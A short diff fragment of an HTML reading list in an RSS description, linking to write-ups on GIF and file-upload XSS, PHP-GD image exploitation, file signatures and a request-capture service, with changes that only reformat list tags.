 <li><a href="https://blackpentesters.blogspot.com.au/2013/08/gif-image-xss.html">&quot;GIF Image XSS&quot; by eXpl0i13r</a></li>
 <li><a href="http://brutelogic.com.br/blog/file-upload-xss/">File Upload XSS | Hack2Learn</a></li>
 <li><a href="https://en.wikipedia.org/wiki/List_of_file_signatures">List of File Signatures | Wikipedia</a></li>
 <li><a href="https://github.com/d0lph1n98/Defeating-PHP-GD-imagecreatefromgif">&quot;Exploiting PHP-GD imagecreatefromgif() function&quot; by d0lph1n98 </a></li>
-</ul></li>
+</ul>
+</li>
 <li>Capturing Requests
-
 <ul>
 <li><a href="https://requestb.in/">Request Bin</a></li>
-</ul></li>
+</ul>
+</li>
 </ul>
 
 	  ]]></description>
